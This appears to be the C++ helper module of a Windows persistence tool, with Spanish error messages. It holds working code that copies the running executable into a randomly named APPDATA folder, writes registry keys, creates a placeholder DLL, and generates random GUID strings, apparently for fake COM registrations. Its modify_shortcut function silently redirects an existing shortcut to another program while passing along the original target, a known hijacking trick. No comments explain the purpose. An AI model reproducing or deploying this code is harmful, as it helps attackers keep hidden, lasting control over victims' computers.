#include <windows.h>
#include <iostream>
#include <unistd.h>
#include <string>
#include <time.h>
#include <list>
#include <shobjidl.h>
#include <shlobj.h>
#include <chrono>

#include "utils.h"

typedef unsigned __int64 QWORD;

using namespace std;

DWORD DwOption = REG_OPTION_NON_VOLATILE;
REGSAM SAM = KEY_ALL_ACCESS;
DWORD TypeStr = REG_SZ;
DWORD TypeNum = REG_DWORD;

const char Alnum[] = "0123456789ABCDEFabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
const char Hex[] = "0123456789ABCDEF";

void error(string mensaje){

    cout << mensaje << endl;

    exit(-1);
}

string randName(int len = 10, bool hex = false){

    srand(time(NULL));

    string s;
    s.reserve(len+1);

    for(int i=0 ; i<len; i++){
        if(hex) s += Hex[rand() % (sizeof(Hex) - 1)];
        else s += Alnum[rand() % (sizeof(Alnum) - 1)];
    }

    return s;
}

string newBinary(string exePath){

    string exeName = exePath.substr(exePath.find_last_of("/\\") + 1);

    string newFolder = randName();

    string parent = getenv("APPDATA");
    string folder = parent + "\\" + newFolder;
    
    if(!CreateDirectoryExA(parent.c_str(), folder.c_str(), NULL)){ error("Creando Directorio"); }

    string binary = folder + "\\" + exeName;

    if(!CopyFileExA(exePath.c_str(), binary.c_str(), NULL, NULL, NULL, 0)){ error("Copiando Fichero"); }

    return binary;
}

void createSampleDll(string path){

    HANDLE h = CreateFileA(path.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
}

void set_registry_value(HKEY rootKey, LPCSTR subKey, LPCSTR name, string *strPtr, DWORD *numPtr){

    DWORD type;
    LPBYTE data;
    DWORD size;

    if(strPtr!=NULL){
        type = TypeStr;
        LPCSTR str = strPtr->c_str();
        data = (LPBYTE) str;
        size = (strlen(str) + 1) * sizeof(char);
    }
    else if(numPtr!=NULL){
        type = TypeNum;
        data = (LPBYTE) numPtr;
        size = sizeof(DWORD);
    }
    else {
        type = REG_QWORD;
        QWORD timestamp = chrono::duration_cast<chrono::milliseconds>(chrono::system_clock::now().time_since_epoch()).count();
        data = (LPBYTE) &timestamp;
        size = sizeof(QWORD);
    }

    HKEY key;
    DWORD res;
    
    LONG st = RegCreateKeyExA(rootKey, subKey, 0, NULL, DwOption, SAM, NULL, &key, &res);

    if(st != ERROR_SUCCESS){ error("Creando Clave"); }
        
    if(res == REG_CREATED_NEW_KEY){

        st = RegOpenKeyExA(rootKey, subKey, 0, SAM, &key);

        if(st != ERROR_SUCCESS) { error("Abriendo Clave"); }
    }

    st = RegSetValueExA(key, name, 0, type, data, size);

    if(st != ERROR_SUCCESS){ error("Asignando Valor"); }

    st = RegCloseKey(key);

    if(st != ERROR_SUCCESS){ error("Cerrando Clave"); }

}

// -lole32 -luuid para compilar
void create_shortcut(string linkPath, string targetPath, string description, string *workDir, string *arguments, string *iconLocation){

    HRESULT hres; 
    IShellLinkA* psl; 

    hres = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if(hres != S_OK){ error("Inicializando COM library"); }
 
    hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkA, (LPVOID*)&psl); 
    if (!SUCCEEDED(hres)) { error("Creando instancia de COM library"); }

    IPersistFile* ppf; 

    // Set the path to the shortcut target and add the description. 
    psl->SetPath(targetPath.c_str()); 
    psl->SetDescription(description.c_str()); 

    // Optional values for link
    if(workDir!=NULL) psl->SetWorkingDirectory(workDir->c_str()); 
    if(arguments!=NULL) psl->SetArguments(arguments->c_str()); 
    if(iconLocation!=NULL) psl->SetIconLocation(iconLocation->c_str(),0); 

    // Query IShellLink for the IPersistFile interface, used for saving the shortcut in persistent storage. 
    hres = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf); 

    if (!SUCCEEDED(hres)) { 
        psl->Release(); 
        error("Preguntando a la interfaz de IPersistFile"); 
    }

    WCHAR wsz[MAX_PATH]; 
 
    // Ensure that the string is Unicode. 
    if(!MultiByteToWideChar(CP_ACP, 0, linkPath.c_str(), -1, wsz, MAX_PATH)){
        ppf->Release(); 
        psl->Release(); 
        error("Transformando a wchar"); 
    }
    
    // Save the link by calling IPersistFile::Save. 
    hres = ppf->Save(wsz, TRUE); 

    ppf->Release(); 
    psl->Release(); 

    if(hres!=S_OK) { error("Guardando el atajo"); }

}

void modify_shortcut(string linkPath, string targetPath){

    HRESULT hres; 
    IShellLinkA* psl; 
    char pathBuff[MAX_PATH];
    WIN32_FIND_DATAA wfd;

    hres = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if(hres != S_OK){ error("Inicializando COM library"); }
 
    hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkA, (LPVOID*)&psl); 
    if (!SUCCEEDED(hres)) { error("Creando instancia de COM library"); }

    IPersistFile* ppf;

    // Get a pointer to the IPersistFile interface. 
    hres = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf); 

    if (!SUCCEEDED(hres)) { 
        psl->Release(); 
        error("Preguntando a la interfaz de IPersistFile"); 
    }

    WCHAR wsz[MAX_PATH]; 
 
    // Ensure that the string is Unicode. 
    if(!MultiByteToWideChar(CP_ACP, 0, linkPath.c_str(), -1, wsz, MAX_PATH)){
        ppf->Release();
        psl->Release(); 
        error("Transformando a wchar"); 
    }

    // Load the shortcut. 
    hres = ppf->Load(wsz, STGM_READWRITE);

    if (!SUCCEEDED(hres)) { 
        ppf->Release();
        psl->Release();
        error("Cargando el link"); 
    }

    hres = psl->GetPath(pathBuff, MAX_PATH, &wfd, SLGP_SHORTPATH); 

    if (!SUCCEEDED(hres)) { 
        ppf->Release();
        psl->Release();
        error("Obteniendo el path del link"); 
    }

    string path = pathBuff;
    string workDir = path.substr(0, path.find_last_of("/\\"));
    
    psl->SetPath(targetPath.c_str());
    psl->SetArguments(pathBuff);
    psl->SetIconLocation(pathBuff,0);
    psl->SetWorkingDirectory(workDir.c_str());

    // Save the shortcut. 
    hres = ppf->Save(wsz, TRUE);

    ppf->Release();
    psl->Release();

}

list<string> ls(string dirPath, string regEx){

    list<string> l;
    WIN32_FIND_DATAA ffd;
    char findPath[dirPath.length() + regEx.length() + 2];
    strcpy(findPath, dirPath.c_str());
    strcat(findPath, regEx.c_str());
    HANDLE hFind = INVALID_HANDLE_VALUE;
    
    hFind = FindFirstFileA((const char *)findPath, &ffd);

    if(hFind==INVALID_HANDLE_VALUE){ error("Buscando primer elemento"); }

    do{
        l.push_back(dirPath + string(ffd.cFileName));

    }while(FindNextFileA(hFind, &ffd) != 0);

    FindClose(hFind);

    return l;
}

string newGuid(){

    string guid = randName(32, TRUE);

    for(auto it=guid.begin() ; it!=guid.end() ; ++it){
        *it = toupper(*it);
    }

    guid.insert(32, 1, '}');
    guid.insert(20, 1, '-');
    guid.insert(16, 1, '-');
    guid.insert(12, 1, '-');
    guid.insert(8, 1, '-');
    guid.insert(0, 1, '{');
    
    return guid;
}